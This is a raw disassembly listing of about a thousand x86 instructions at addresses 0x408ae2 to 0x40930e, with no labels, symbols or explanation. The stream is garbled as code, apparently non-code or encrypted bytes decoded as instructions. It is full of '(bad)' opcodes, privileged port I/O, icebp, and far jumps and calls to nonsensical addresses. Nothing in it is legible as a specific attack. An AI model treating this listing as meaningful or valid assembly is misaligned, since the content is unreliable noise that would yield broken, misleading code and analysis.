  408ae2:	enter  0xcbf0,0xcd
  408ae6:	mov    edi,0xf9bcf4cf
  408aeb:	hlt    
  408aec:	sti    
  408aed:	add    eax,0xdc6f0fa
  408af2:	mov    ch,0xc9
  408af5:	ftst   
  408af7:	mov    edi,0xe9c6dcc7
  408afc:	icebp  
  408afd:	leave  
  408afe:	in     eax,0xb8
  408b00:	fstp   TBYTE PTR [eax-0x1d02102c]
  408b06:	out    dx,eax
  408b07:	std    
  408b08:	push   es
  408b09:	add    ebp,ebx
  408b0b:	jecxz  0x408b0f
  408b0d:	loope  0x408b19
  408b0f:	retf   0x407
  408b12:	jmp    0xec339ef5
  408b17:	mov    cl,0xce
  408b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b1a:	leave  
  408b1b:	in     eax,dx
  408b1c:	loope  0x408ae3
  408b1e:	not    esi
  408b20:	repnz iret 
  408b22:	(bad)  
  408b23:	stc    
  408b24:	rcr    al,cl
  408b26:	xlat   BYTE PTR ds:[ebx]
  408b27:	inc    bh
  408b29:	(bad)  
  408b2a:	(bad)  
  408b2b:	cld    
  408b2c:	add    al,0xc2
  408b2e:	ret    
  408b2f:	leave  
  408b30:	or     al,BYTE PTR ds:0xe4c90fc4
  408b36:	lods   al,BYTE PTR ds:[esi]
  408b37:	rol    eax,0xe8
  408b3a:	loopne 0x408b37
  408b3c:	mov    dh,0xb4
  408b3e:	in     eax,0xe8
  408b40:	aam    0xd1
  408b42:	stc    
  408b43:	fstp   st(4)
  408b45:	into   
  408b46:	loopne 0x408b04
  408b48:	into   
  408b49:	(bad)  
  408b4a:	stc    
  408b4b:	add    al,0xf8
  408b4d:	(bad)  
  408b4e:	out    0xe9,al
  408b50:	(bad)  
  408b51:	clc    
  408b52:	or     al,dh
  408b54:	(bad)  
  408b56:	jecxz  0x408b08
  408b58:	jmp    0x408b21
  408b5a:	mov    ebp,0xecf0d4bc
  408b5f:	xbegin 0xb52c6511
  408b65:	ret    0xbcf0
  408b68:	sar    ebp,cl
  408b6a:	test   DWORD PTR [ebx],0xddf1f902
  408b70:	sar    esp,0xe8
  408b73:	in     eax,0xce
  408b75:	(bad)  
  408b77:	mov    al,0xc5
  408b79:	mov    dh,0xf5
  408b7b:	test   dh,0xd0
  408b7e:	(bad)  
  408b7f:	retf   
  408b80:	(bad)  
  408b81:	shl    ebp,cl
  408b83:	int3   
  408b84:	call   0xf6287b61
  408b89:	int3   
  408b8a:	(bad)  
  408b8c:	add    al,BYTE PTR [eax]
  408b8e:	pop    es
  408b8f:	xlat   BYTE PTR ds:[ebx]
  408b90:	call   0xcb49745b
  408b95:	psubusb mm7,QWORD PTR [eax-0x3e303329]
  408b9c:	retf   0xf3fb
  408b9f:	shl    bl,1
  408ba1:	mov    ch,0xb9
  408ba3:	(bad)  
  408ba4:	mov    cl,0xd8
  408ba6:	out    dx,eax
  408ba7:	rcl    bh,1
  408ba9:	loopne 0x408b9c
  408bab:	std    
  408bac:	jmp    0x408bb5
  408bae:	rol    eax,1
  408bb0:	add    edi,eax
  408bb2:	jmp    0x408ba2
  408bb4:	add    edx,esi
  408bb6:	jmp    0xedef8265
  408bbb:	mov    ch,0xc7
  408bbd:	test   bl,0xb8
  408bc0:	cli    
  408bc1:	fscale 
  408bc3:	fnstsw WORD PTR [ecx-0x3e302d07]
  408bc9:	into   
  408bca:	(bad)  
  408bcc:	hlt    
  408bcd:	(bad)
  408bd0:	or     bh,ah
  408bd2:	cld    
  408bd3:	add    BYTE PTR ds:0xb3d2c3e2,al
  408bd9:	mov    cl,0xb6
  408bdb:	retf   0xecb5
  408bde:	cli    
  408bdf:	int3   
  408be0:	xlat   BYTE PTR ds:[ebx]
  408be1:	int    0xdb
  408be3:	fnstenv [ebp-0x3222052c]
  408be9:	ret    
  408bea:	call   edx
  408bec:	loope  0x408bb3
  408bee:	add    bh,ah
  408bf0:	retf   
  408bf1:	(bad)  
  408bf2:	(bad)  
  408bf4:	int    0x1
  408bf6:	out    dx,eax
  408bf7:	in     al,dx
  408bf8:	rcl    bl,1
  408bfa:	lds    ebp,FWORD PTR [edx-0x42a2445]
  408c00:	aam    0xf3
  408c02:	jmp    0xecf56bd4
  408c07:	add    ecx,esi
  408c09:	int3   
  408c0a:	shl    al,1
  408c0c:	sar    DWORD PTR [eax-0x4f00a39],0xff
  408c13:	clc    
  408c14:	add    BYTE PTR ds:0xcfe5ceb1,cl
  408c1a:	xlat   BYTE PTR ds:[ebx]
  408c1b:	mov    cl,0xe5
  408c1d:	(bad)  
  408c1e:	icebp  
  408c1f:	into   
  408c20:	not    bh
  408c22:	cmc    
  408c23:	out    dx,al
  408c24:	enter  0xfaf9,0xce
  408c28:	stc    
  408c29:	icebp  
  408c2a:	jecxz  0x408bf2
  408c2c:	cmc    
  408c2d:	fcomi  st,st(0)
  408c2f:	cli    
  408c30:	aad    0xde
  408c32:	add    edx,ebx
  408c34:	loopne 0x408c20
  408c36:	fdivr  DWORD PTR [ebp-0x350d3841]
  408c3c:	enter  0xb2e2,0xef
  408c40:	in     eax,0xf2
  408c42:	mov    bl,0xb6
  408c44:	jmp    0x408c22
  408c46:	sti    
  408c47:	(bad)  
  408c49:	add    edi,DWORD PTR [esi-0x2a1d2a3f]
  408c4f:	fsubp  st(2),st
  408c51:	or     esi,ebx
  408c53:	psubd  mm3,mm5
  408c56:	jmp    0xcdb0:0xafc7ecbd
  408c5d:	test   al,0xca
  408c5f:	(bad)  
  408c60:	into   
  408c61:	(bad)  
  408c63:	in     al,0xed
  408c65:	sti    
  408c66:	fdivp  st(0),st
  408c68:	shl    bl,0xe2
  408c6b:	fcmovu st,st(7)
  408c6d:	aad    0xea
  408c6f:	hlt    
  408c70:	retf   
  408c71:	loop   0x408c7f
  408c73:	or     ch,ch
  408c75:	in     eax,0xe0
  408c77:	in     al,dx
  408c78:	into   
  408c79:	ret    
  408c7a:	int3   
  408c7b:	jmp    0x408c3d
  408c7d:	out    dx,eax
  408c7e:	in     al,0xe6
  408c80:	out    0xcf,al
  408c82:	sar    cl,cl
  408c84:	jmp    0xc8007a3d
  408c89:	(bad)  
  408c8a:	std    
  408c8b:	mov    BYTE PTR [edi],0xc7
  408c8e:	retf   
  408c8f:	retf   
  408c90:	jmp    0xc2cd:0xe90fc8d4
  408c97:	in     al,0xd6
  408c99:	loopne 0x408c5b
  408c9b:	repz aad 0xd6
  408c9e:	xlat   BYTE PTR ds:[ebx]
  408c9f:	stc    
  408ca0:	int3   
  408ca1:	fsubr  st,st(0)
  408ca3:	mov    esp,0xd1bbd7da
  408ca8:	sar    al,0xe6
  408cab:	add    eax,0xf807fedb
  408cb0:	push   es
  408cb1:	paddsb mm0,QWORD PTR [ebx]
  408cb4:	add    eax,0xc0ddd004
  408cb9:	retf   0xb6af
  408cbc:	mov    cl,0xd3
  408cbe:	mov    ah,0xae
  408cc0:	in     al,0xe8
  408cc2:	mov    ch,0xf0
  408cc4:	(bad)  
  408cc5:	repnz fdivp st(4),st
  408cc8:	cli    
  408cc9:	aad    0xe7
  408ccb:	std    
  408ccc:	clc    
  408ccd:	sar    esp,1
  408ccf:	cld    
  408cd0:	stc    
  408cd1:	leave  
  408cd2:	ret    
  408cd3:	pop    es
  408cd4:	fcomip st,st(2)
  408cd6:	icebp  
  408cd7:	rol    ebp,0xc4
  408cda:	shr    eax,0xac
  408cdd:	shl    ah,1
  408cdf:	repz retf 0xefec
  408ce3:	(bad)  
  408ce5:	stc    
  408ce6:	fcmovbe st,st(4)
  408ce8:	(bad)  
  408ce9:	neg    ch
  408ceb:	(bad)  
  408ced:	faddp  st(0),st
  408cef:	les    eax,FWORD PTR [edi]
  408cf1:	(bad)  
  408cf2:	jmp    0xcce0:0xeac4f3c5
  408cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cfa:	int3   
  408cfb:	fmul   st(2),st
  408cfd:	out    0xeb,al
  408cff:	in     al,0xc8
  408d01:	lock fdiv st(2),st
  408d04:	ret    
  408d05:	fcmovne st,st(4)
  408d07:	rol    DWORD PTR [edi],cl
  408d09:	ret    0xc3d8
  408d0c:	lock loop 0x408cd6
  408d0f:	out    0xe3,eax
  408d11:	aam    0xfb
  408d13:	iret   
  408d14:	retf   0xc3ee
  408d17:	loope  0x408cef
  408d19:	out    dx,al
  408d1a:	rcl    dl,0xf6
  408d1d:	test   al,0xd2
  408d1f:	jmp    0xf6f4:0xf1efc8f3
  408d26:	mov    ebx,0xbed5d3f0
  408d2b:	fsub   st,st(2)
  408d2d:	rcr    dh,cl
  408d2f:	fcomp  st(2)
  408d31:	fsubp  st(5),st
  408d33:	(bad)  
  408d34:	fmulp  st(0),st
  408d36:	mov    esi,0xf5ecebb8
  408d3b:	repz mov bh,0xe6
  408d3e:	loopne 0x408d0c
  408d40:	(bad)  
  408d41:	(bad)  
  408d43:	in     eax,dx
  408d44:	fucomp st(2)
  408d46:	rol    DWORD PTR [edx],0xde
  408d49:	repz loope 0x408d24
  408d4c:	mov    esp,0x1dbf9f9
  408d51:	add    dh,al
  408d53:	or     eax,DWORD PTR [esi]
  408d55:	add    ebp,ebp
  408d57:	loopne 0x408d1f
  408d59:	(bad)  
  408d5a:	cmc    
  408d5b:	lock mov dh,0xec
  408d5e:	vpsllq ymm7,ymm6,xmm2
  408d62:	(bad)
  408d65:	push   ebx
  408d67:	std    
  408d68:	shl    ebp,cl
  408d6a:	(bad)  
  408d6d:	(bad)  
  408d6e:	mov    edi,0xd5e1d8d4
  408d73:	les    ecx,FWORD PTR [edx]
  408d75:	shr    bl,cl
  408d77:	loope  0x408d59
  408d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d7a:	scas   al,BYTE PTR es:[edi]
  408d7b:	jmp    0xf2d6:0xdfc7d7b1
  408d82:	leave  
  408d83:	sti    
  408d84:	int    0xd6
  408d86:	jecxz  0x408d46
  408d88:	push   es
  408d89:	loope  0x408d66
  408d8b:	out    0xd1,eax
  408d8d:	retf   
  408d8e:	cli    
  408d8f:	or     dl,bl
  408d91:	jmp    0x408d87
  408d93:	(bad)  
  408d95:	jecxz  0x408d62
  408d97:	mov    edi,0xb6aeacef
  408d9c:	out    0xef,eax
  408d9e:	jmp    0xd2d2:0xf3d4e8ce
  408da5:	not    edi
  408da7:	icebp  
  408da8:	cld    
  408da9:	xlat   BYTE PTR ds:[ebx]
  408daa:	sar    DWORD PTR [esi+0x4f1dbcb],1
  408db0:	loopne 0x408da0
  408db2:	(bad)  
  408db3:	std    
  408db4:	shr    edi,0xbd
  408db7:	enter  0xbdb7,0xb3
  408dbb:	div    edx
  408dbd:	loop   0x408d87
  408dbf:	xlat   BYTE PTR ds:[ebx]
  408dc0:	in     eax,0xc9
  408dc2:	aad    0xdb
  408dc4:	out    dx,eax
  408dc5:	ret    0x0
  408dc8:	sti    
  408dc9:	add    dh,dl
  408dcb:	jecxz  0x408dc7
  408dcd:	aad    0xe8
  408dcf:	add    ebp,edi
  408dd1:	add    dl,ch
  408dd3:	loope  0x408da2
  408dd5:	add    al,0xad
  408dd7:	into   
  408dd8:	(bad)  
  408dd9:	shl    eax,0xef
  408ddc:	leave  
  408ddd:	retf   0xf0b0
  408de0:	int    0xbe
  408de2:	test   bl,0xcb
  408de5:	loop   0x408daa
  408de7:	ror    ah,0xfc
  408dea:	out    0xbc,al
  408dec:	in     al,0xe6
  408dee:	sti    
  408def:	push   es
  408df0:	test   BYTE PTR [edi],0xc9
  408df3:	les    ecx,FWORD PTR [ebx]
  408df5:	jmp    0xe40071b2
  408dfa:	stos   DWORD PTR es:[edi],eax
  408dfb:	mov    dl,0xc6
  408dfd:	xlat   BYTE PTR ds:[ebx]
  408dfe:	(bad)  
  408dff:	jmp    FWORD PTR [ebp-0x82f0650]
  408e05:	loope  0x408dd3
  408e07:	cli    
  408e08:	mov    eax,0xfcccc2ed
  408e0d:	add    edi,edi
  408e0f:	mul    ebx
  408e11:	call   0x54388db
  408e16:	ror    edi,1
  408e18:	mov    bl,0xc7
  408e1a:	mov    dh,0xb3
  408e1c:	xlat   BYTE PTR ds:[ebx]
  408e1d:	mov    bl,0xc1
  408e1f:	(bad)  
  408e20:	iret   
  408e21:	in     al,0xbe
  408e23:	(bad)  
  408e24:	in     al,dx
  408e25:	out    dx,al
  408e26:	fidivr WORD PTR [esi-0x14004732]
  408e2c:	lock jmp 0xbd016bf9
  408e32:	lds    ecx,FWORD PTR ds:0xc8c6dee0
  408e38:	mov    esp,0xeebcd2ac
  408e3d:	out    0xaf,eax
  408e3f:	in     eax,0xb4
  408e41:	sar    BYTE PTR [ecx-0xa334508],cl
  408e47:	fdiv   st,st(3)
  408e49:	stc    
  408e4a:	int3   
  408e4b:	add    al,BYTE PTR [ebx]
  408e4d:	rol    DWORD PTR [esi],0xda
  408e50:	fdivr  st(6),st
  408e52:	jmp    0x408e19
  408e54:	add    edi,edi
  408e56:	retf   
  408e57:	leave  
  408e58:	loope  0x408e2c
  408e5a:	(bad)  
  408e5b:	mov    bh,0xce
  408e5d:	in     al,0xe7
  408e5f:	int    0xeb
  408e61:	(bad)  
  408e62:	fstp   st(3)
  408e64:	aam    0x1
  408e66:	out    dx,eax
  408e67:	cli    
  408e68:	add    BYTE PTR [ebx],al
  408e6a:	fcom   st(4)
  408e6c:	loopne 0x408e45
  408e6e:	xlat   BYTE PTR ds:[ebx]
  408e6f:	in     eax,0xf5
  408e71:	jmp    0xc12a8a85
  408e76:	enter  0xe3cf,0xe0
  408e7a:	int    0xd4
  408e7c:	lods   eax,DWORD PTR ds:[esi]
  408e7d:	cli    
  408e7e:	cli    
  408e7f:	(bad)  
  408e80:	mov    edx,0xdcf4e5cd
  408e85:	(bad)  
  408e87:	shl    ecx,0x7
  408e8a:	loopne 0x408e64
  408e8c:	cld    
  408e8d:	retf   0x2d0
  408e90:	in     eax,0xcf
  408e92:	pminsw mm2,QWORD PTR [edx]
  408e95:	jecxz  0x408e55
  408e97:	in     eax,0xc4
  408e99:	int3   
  408e9a:	mov    cl,0xcd
  408e9c:	xlat   BYTE PTR ds:[ebx]
  408e9d:	mov    ch,0xe8
  408e9f:	in     al,dx
  408ea0:	mov    ah,0xd4
  408ea2:	in     eax,0xf5
  408ea4:	repz mov edx,0xf1defdf4
  408eaa:	out    0xbc,eax
  408eac:	aam    0x4
  408eae:	or     ch,bh
  408eb0:	fcmovnb st,st(6)
  408eb2:	in     al,0xd9
  408eb4:	(bad)  
  408eb5:	fsubrp st(7),st
  408eb7:	in     al,0xcc
  408eb9:	fdivr  QWORD PTR [edi+eax*8-0xf4d4806]
  408ec0:	rol    ch,cl
  408ec2:	mov    ebx,0xd0bed8c4
  408ec7:	add    eax,edx
  408ec9:	aam    0xe5
  408ecb:	loopne 0x408ec7
  408ecd:	(bad)  
  408ece:	fdecstp 
  408ed0:	or     dh,ch
  408ed2:	fndisi(8087 only) 
  408ed4:	adc    esp,eax
  408ed6:	mov    bl,0xb3
  408ed8:	jmp    0x408ebe
  408eda:	jmp    0x408ec6
  408edc:	hlt    
  408edd:	neg    ecx
  408edf:	leave  
  408ee0:	mov    cl,0xba
  408ee2:	div    al
  408ee4:	cli    
  408ee5:	clc    
  408ee6:	repnz sar bl,cl
  408ee9:	(bad)  
  408eea:	jecxz  0x408ecc
  408eec:	or     al,BYTE PTR [ebx]
  408eee:	jmp    0x7e1:0xed04ffdf
  408ef5:	jecxz  0x408ed5
  408ef7:	fnsave [edx-0x111c154f]
  408efd:	in     al,0xf3
  408eff:	neg    ecx
  408f01:	fidivr DWORD PTR [edx+0x3cfeb03]
  408f07:	aad    0xd4
  408f09:	fcomp  st(1)
  408f0b:	add    ecx,esi
  408f0d:	(bad)  
  408f0e:	out    0xf7,eax
  408f10:	loop   0x408f1c
  408f12:	add    ecx,DWORD PTR [eax]
  408f14:	or     edx,ebp
  408f16:	shr    DWORD PTR [eax-0x160c3a38],cl
  408f1c:	iret   
  408f1d:	retf   0xe0d6
  408f20:	call   0xf63d67fd
  408f25:	ret    0xbfc8
  408f28:	int3   
  408f29:	sar    ecx,0xd7
  408f2c:	in     eax,0xd0
  408f2e:	ret    0x106
  408f31:	jecxz  0x408efb
  408f33:	(bad)  
  408f34:	(bad)  
  408f36:	fcom   st(2)
  408f38:	fucomp st(7)
  408f3a:	jmp    0xf5b4:0xbbccc1c2
  408f41:	jmp    0xf703:0xbeefdff1
  408f48:	mov    eax,0xf0d2d0d8
  408f4d:	loop   0x408f31
  408f4f:	add    cl,dl
  408f51:	(bad)  
  408f52:	loop   0x408f3b
  408f54:	fild   DWORD PTR [eax]
  408f56:	out    0xd7,eax
  408f58:	repz mov bh,0xd5
  408f5b:	scas   al,BYTE PTR es:[edi]
  408f5c:	shl    al,0xb4
  408f5f:	call   edi
  408f61:	(bad)  
  408f62:	iret   
  408f63:	(bad)  
  408f64:	retf   0xf8d7
  408f67:	mov    ecx,0xc2c1f601
  408f6c:	les    eax,FWORD PTR [ebx]
  408f6e:	sar    ch,1
  408f70:	retf   
  408f71:	out    dx,al
  408f72:	loop   0x408f6c
  408f74:	into   
  408f75:	stc    
  408f76:	fdivr  DWORD PTR [esi-0x1b083057]
  408f7c:	icebp  
  408f7d:	mov    ebx,0xc6e4e0e7
  408f82:	(bad)  
  408f84:	icebp  
  408f85:	(bad)  
  408f86:	sti    
  408f87:	mov    edx,0xf1f0f102
  408f8c:	push   es
  408f8d:	xlat   BYTE PTR ds:[ebx]
  408f8e:	mov    BYTE PTR [ecx],0xd5
  408f91:	fdivp  st(1),st
  408f93:	paddusb mm1,QWORD PTR [ebx]
  408f96:	jmp    0xe9b6:0xc8e4ece7
  408f9d:	into   
  408f9e:	cli    
  408f9f:	mov    ebx,0xf4cdbbef
  408fa4:	retf   
  408fa5:	shl    dl,1
  408fa7:	ffreep st(0)
  408fa9:	into   
  408faa:	ret    0xe3f9
  408fad:	(bad)  
  408fae:	fcmovnb st,st(2)
  408fb0:	retf   0xed0e
  408fb3:	(bad)  
  408fb4:	jmp    0x408f90
  408fb6:	mov    cl,0xc9
  408fb8:	xlat   BYTE PTR ds:[ebx]
  408fb9:	lods   al,BYTE PTR ds:[esi]
  408fba:	mov    esp,0xbbdbd6c8
  408fbf:	xlat   BYTE PTR ds:[ebx]
  408fc0:	(bad)
  408fc3:	icebp  
  408fc4:	jecxz  0x408fba
  408fc6:	ret    
  408fc7:	mov    ecx,0xd9d305f8
  408fcc:	rol    DWORD PTR [esi],0xd7
  408fcf:	(bad)  
  408fd0:	(bad)  
  408fd2:	aam    0x1
  408fd4:	iret   
  408fd5:	add    al,0xec
  408fd7:	ror    cl,0xc5
  408fda:	mov    ebp,0xc5dae8ec
  408fdf:	jmp    0x408fba
  408fe1:	sar    DWORD PTR [ebx-0x7402111],cl
  408fe7:	loop   0x408fc5
  408fe9:	icebp  
  408fea:	(bad)  
  408feb:	in     al,dx
  408fec:	cmc    
  408fed:	stc    
  408fee:	cli    
  408fef:	fabs   
  408ff1:	or     eax,0xe1ce01ee
  408ff6:	mov    esp,0xabcdccf3
  408ffb:	aad    0xc8
  408ffd:	stc    
  408ffe:	cmc    
  408fff:	call   0xb60f4fb1
  409004:	xlat   BYTE PTR ds:[ebx]
  409005:	add    eax,edx
  409007:	shl    esi,1
  409009:	(bad)  
  40900a:	std    
  40900b:	sti    
  40900c:	sti    
  40900d:	lock jmp 0xc6fd7514
  409013:	call   0xc51059dc
  409018:	lods   al,BYTE PTR ds:[esi]
  409019:	jmp    0xe70877eb
  40901e:	cli    
  40901f:	fcomp  st(2)
  409021:	mov    ch,0xf8
  409023:	(bad)  
  409024:	retf   0xbcf7
  409027:	aam    0xd6
  409029:	icebp  
  40902a:	pop    es
  40902b:	hlt    
  40902c:	mul    ah
  40902e:	push   es
  40902f:	ret    0xe4f8
  409032:	fmul   QWORD PTR [eax]
  409034:	stc    
  409035:	jmp    0xd4f0:0xcaf1c3e2
  40903c:	ret    0xeec1
  40903f:	icebp  
  409040:	cmc    
  409041:	imul   bl
  409043:	mov    esi,0xf7e2b9d3
  409048:	mov    esi,0xdac4fcfa
  40904d:	(bad)  
  40904e:	sti    
  40904f:	fimul  DWORD PTR [esi]
  409051:	cld    
  409052:	(bad)  
  409054:	cld    
  409055:	fchs   
  409057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409058:	div    dh
  40905a:	int3   
  40905b:	jecxz  0x409041
  40905d:	iret   
  40905e:	retf   0xc5cf
  409061:	mov    ecx,0xfff2d4f8
  409066:	repz rol DWORD PTR [esi],0xf7
  40906a:	in     eax,0xf5
  40906c:	loope  0x40902f
  40906e:	(bad)  
  409070:	cmc    
  409071:	leave  
  409072:	fisttp DWORD PTR [edi+ecx*8]
  409075:	int3   
  409076:	faddp  st(4),st
  409078:	imul   esi
  40907a:	mov    esp,0xf2fafac5
  40907f:	shr    ah,1
  409081:	lods   al,BYTE PTR ds:[esi]
  409082:	fdiv   st(7),st
  409084:	mov    ecx,0xc1ddd0d1
  409089:	(bad)  
  40908a:	cld    
  40908b:	shl    bh,0xd2
  40908e:	fucom  st(6)
  409090:	out    dx,eax
  409091:	mov    ch,0xdc
  409094:	push   cs
  409095:	add    ah,cl
  409097:	test   al,0xe1
  409099:	(bad)  
  40909a:	in     eax,dx
  40909b:	fld    TBYTE PTR [ecx-0x44d301c]
  4090a1:	in     eax,dx
  4090a2:	enter  0xeb03,0xe1
  4090a6:	fst    st(5)
  4090a8:	ret    
  4090a9:	(bad)  
  4090ab:	hlt    
  4090ac:	out    0x4,al
  4090ae:	add    ecx,eax
  4090b0:	std    
  4090b1:	fimul  WORD PTR ds:0xaa00dec6
  4090b7:	mov    cl,0xbe
  4090b9:	loop   0x40906d
  4090bb:	mov    esp,0xc8d2e7d1
  4090c0:	fstp   TBYTE PTR [eax-0x2c031635]
  4090c6:	(bad)  
  4090c8:	fdivr  st(4),st
  4090ca:	in     al,0xde
  4090cc:	(bad)  
  4090ce:	jmp    0xea4a99be
  4090d3:	jecxz  0x4090c2
  4090d5:	icebp  
  4090d6:	int3   
  4090d7:	test   al,0xec
  4090d9:	shl    BYTE PTR [ebp-0x36315254],cl
  4090df:	jmp    0xf2fd:0xd3eceed9
  4090e6:	enter  0xc1ba,0x7
  4090ea:	mov    ebp,0xd8f4f2c7
  4090ef:	or     al,BYTE PTR [ecx]
  4090f1:	(bad)  
  4090f2:	fadd   QWORD PTR ds:0xf3ddd309
  4090f8:	mov    edi,0xb6f6ade8
  4090fd:	int3   
  4090fe:	(bad)
  409101:	mov    edi,0xc3e9efbe
  409106:	mov    eax,0xdb03cffb
  40910b:	(bad)  
  40910c:	in     eax,0xf0
  40910e:	stc    
  40910f:	loopne 0x409119
  409111:	(bad)  
  409113:	enter  0x708,0xaa
  409117:	out    dx,al
  409118:	xlat   BYTE PTR ds:[ebx]
  409119:	(bad)  
  40911a:	mov    ebp,0xe8cae0e6
  40911f:	mul    esi
  409121:	mov    ebx,0xf6bceebe
  409126:	sar    DWORD PTR [edi-0x2644311e],0x7
  40912d:	fdivr  st,st(6)
  40912f:	sti    
  409130:	neg    bh
  409132:	out    dx,eax
  409133:	adc    eax,DWORD PTR [eax]
  409135:	jmp    0xf7ac:0xf5afaebd
  40913c:	(bad)  
  40913d:	icebp  
  40913e:	mov    bh,0xea
  409140:	retf   0xf2d7
  409143:	jmp    0x1f86238
  409148:	ffreep st(6)
  40914a:	mov    edi,0xead1dfda
  40914f:	(bad)  
  409150:	xlat   BYTE PTR ds:[ebx]
  409151:	add    BYTE PTR ds:0xded912e3,al
  409157:	ror    bh,1
  409159:	loope  0x40914b
  40915b:	mov    bl,0xbb
  40915d:	in     eax,dx
  40915e:	test   ebp,0xd6ffd9fa
  409164:	fdivr  DWORD PTR [esi-0x433f2b44]
  40916a:	fimul  WORD PTR [ebx]
  40916c:	or     ebx,esp
  40916e:	rol    BYTE PTR [ecx],1
  409170:	fmul   st(7),st
  409172:	clc    
  409173:	fucom  st(4)
  409175:	adc    eax,eax
  409177:	shl    BYTE PTR [edx-0x110e1e51],0xd7
  40917e:	rcl    ebx,cl
  409180:	out    0xeb,eax
  409182:	xlat   BYTE PTR ds:[ebx]
  409183:	idiv   DWORD PTR [ebp+0x6e202f7]
  409189:	ret    0xe103
  40918c:	or     bl,dl
  40918e:	ror    bl,1
  409190:	jmp    0xaaee:0xe9f9cff8
  409197:	ret    
  409198:	ret    
  409199:	shl    DWORD PTR [esi-0x6351339],cl
  40919f:	mov    cl,0xe8
  4091a1:	(bad)  
  4091a4:	in     al,dx
  4091a5:	lock add esi,edi
  4091a8:	in     eax,dx
  4091a9:	aam    0x4
  4091ab:	(bad)  
  4091ad:	rcr    ch,0xbe
  4091b0:	retf   0x8c9
  4091b3:	aam    0xe1
  4091b5:	jmp    0x409176
  4091b7:	ret    
  4091b8:	mov    esi,0xf5d2f4c4
  4091bd:	lods   al,BYTE PTR ds:[esi]
  4091be:	mov    bl,0xd2
  4091c0:	in     eax,0xe8
  4091c2:	enter  0xb9ef,0xec
  4091c6:	xlat   BYTE PTR ds:[ebx]
  4091c7:	div    ah
  4091c9:	push   es
  4091ca:	add    edi,esi
  4091cc:	stc    
  4091cd:	in     al,0xb
  4091cf:	mov    esi,0xe6fe0fdd
  4091d4:	add    eax,0xf1cddedf
  4091d9:	loope  0x4091c8
  4091db:	out    dx,al
  4091dc:	into   
  4091dd:	lock jmp 0xf83e809c
  4091e3:	aam    0xe3
  4091e5:	sar    ebx,1
  4091e7:	pop    es
  4091e8:	in     al,dx
  4091e9:	(bad)  
  4091eb:	(bad)  
  4091ec:	repz add al,0xfa
  4091ef:	dec    BYTE PTR [ecx]
  4091f1:	loopne 0x4091ee
  4091f3:	in     al,dx
  4091f4:	fiadd  WORD PTR [eax]
  4091f6:	iret   
  4091f7:	out    dx,al
  4091f8:	lock fsubp st(7),st
  4091fb:	int3   
  4091fc:	into   
  4091fd:	aad    0xf2
  4091ff:	sar    bh,1
  409201:	aam    0xce
  409203:	call   0xf0f86ff0
  409208:	mov    ecx,0xbc0d305
  40920d:	aam    0xe3
  40920f:	sti    
  409210:	dec    BYTE PTR [ebx]
  409212:	loop   0x4091fe
  409214:	or     ebp,ebp
  409216:	in     al,0xc6
  409218:	in     al,dx
  409219:	icebp  
  40921a:	mov    cl,0xe0
  40921c:	iret   
  40921d:	cmc    
  40921e:	out    dx,al
  40921f:	repz aad 0xc9
  409222:	mov    ecx,0xd2d3ebbe
  409227:	mov    eax,0xff02fdc1
  40922c:	push   es
  40922d:	or     esi,esi
  40922f:	jecxz  0x40923a
  409231:	or     edi,edi
  409233:	aam    0x12
  409235:	or     edx,edx
  409237:	out    dx,eax
  409238:	shl    DWORD PTR [ebx-0x38323230],cl
  40923e:	(bad)
  409241:	vpand  ymm6,ymm3,YMMWORD PTR [ecx-0x1dfe4304]
  409249:	push   es
  40924a:	icebp  
  40924b:	icebp  
  40924c:	fdiv   st,st(5)
  40924e:	les    ecx,FWORD PTR [ebx]
  409250:	cld    
  409251:	in     al,0xcf
  409253:	add    ch,ch
  409255:	pop    es
  409256:	loope  0x409216
  409258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409259:	scas   al,BYTE PTR es:[edi]
  40925a:	(bad)  
  40925b:	mov    dh,0xef
  40925d:	int3   
  40925e:	rcr    bl,cl
  409260:	retf   0xd3ff
  409263:	out    dx,al
  409264:	fst    st(0)
  409266:	add    dh,ch
  409268:	out    dx,eax
  409269:	sti    
  40926a:	stc    
  40926b:	sar    eax,cl
  40926d:	retf   0xf6e0
  409270:	fcomi  st,st(5)
  409272:	out    dx,al
  409273:	hlt    
  409274:	out    0xef,al
  409276:	mov    eax,0xe9f3f0ea
  40927b:	in     al,0xce
  40927d:	repz call 0xfa264b51
  409283:	jecxz  0x40923a
  409285:	jmp    0xfe174a8a
  40928a:	not    ah
  40928c:	mov    ebp,0xdbeaf102
  409291:	add    eax,0xe2fae3ff
  409296:	shr    cl,cl
  409298:	out    0xe8,eax
  40929a:	out    dx,eax
  40929b:	aad    0xc7
  40929d:	in     eax,0xd5
  40929f:	in     al,0xca
  4092a1:	int3   
  4092a2:	mov    ch,0xdd
  4092a4:	jmp    0x4092a0
  4092a6:	leave  
  4092a7:	cli    
  4092a8:	mov    ch,0x3
  4092aa:	(bad)  
  4092ac:	fsubrp st(1),st
  4092ae:	not    ah
  4092b0:	out    0xc4,al
  4092b2:	aam    0xf
  4092b4:	out    dx,eax
  4092b5:	out    0xbd,al
  4092b7:	retf   
  4092b8:	into   
  4092b9:	test   al,0xe6
  4092bb:	sti    
  4092bc:	out    0xf7,al
  4092be:	hlt    
  4092bf:	out    0xe4,al
  4092c1:	mov    ebx,0xe2bbb6ec
  4092c6:	(bad)  
  4092c8:	(bad)  
  4092c9:	fld    QWORD PTR ds:0xf9fad6c4
  4092cf:	enter  0xe809,0x7
  4092d3:	cld    
  4092d4:	add    esi,esp
  4092d6:	ret    0xb7c9
  4092d9:	repnz mov bh,0xcb
  4092dc:	repnz mov cl,0xea
  4092df:	scas   al,BYTE PTR es:[edi]
  4092e0:	mov    cl,0xc9
  4092e2:	cld    
  4092e3:	int    0x2
  4092e5:	cld    
  4092e6:	cld    
  4092e7:	repnz fyl2x 
  4092ea:	push   edi
  4092ec:	add    ecx,DWORD PTR [ebx]
  4092ee:	icebp  
  4092ef:	aam    0xe1
  4092f1:	cli    
  4092f2:	(bad)  
  4092f3:	fsubp  st(6),st
  4092f5:	jmp    0xb7d4:0xedc6e8c7
  4092fc:	out    0xf1,eax
  4092fe:	sti    
  4092ff:	ror    ebp,cl
  409301:	out    0xca,al
  409303:	cld    
  409304:	jmp    0x33482d7
  409309:	sti    
  40930a:	(bad)  
  40930c:	shl    esp,1
  40930e:	(bad)  
